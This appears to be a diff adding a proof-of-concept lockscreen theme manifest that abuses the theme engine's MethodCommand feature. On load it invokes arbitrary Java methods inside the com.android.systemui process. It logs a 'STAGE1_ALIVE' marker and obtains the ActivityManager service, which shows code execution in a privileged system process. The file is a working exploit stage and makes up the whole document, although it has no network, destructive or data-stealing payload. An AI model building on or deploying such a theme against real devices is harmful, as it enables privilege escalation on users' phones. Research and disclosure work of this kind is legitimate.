@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Minimal, harmless proof of execution.
+  Place as `advance/manifest.xml` inside a lockscreen package, then apply it.
+  Expect logcat tag POC to print STAGE1_ALIVE, from the com.android.systemui pid.
+  No destructive action, no permission change, no network.
+-->
+<Lockscreen displayDesktop="false" frameRate="0" screenWidth="1080" version="2">
+    <ExternalCommands>
+        <Trigger action="init">
+            <MethodCommand class="android.util.Log" method="d"
+                params="'POC','STAGE1_ALIVE'"
+                paramTypes="String,String" />
+            <MethodCommand class="android.app.ActivityManager" method="getService"
+                return="ams" />
+        </Trigger>
+    </ExternalCommands>
+    <Text x="120" y="400" size="42" color="#FFFF0000" text="POC-OK" />
+</Lockscreen>
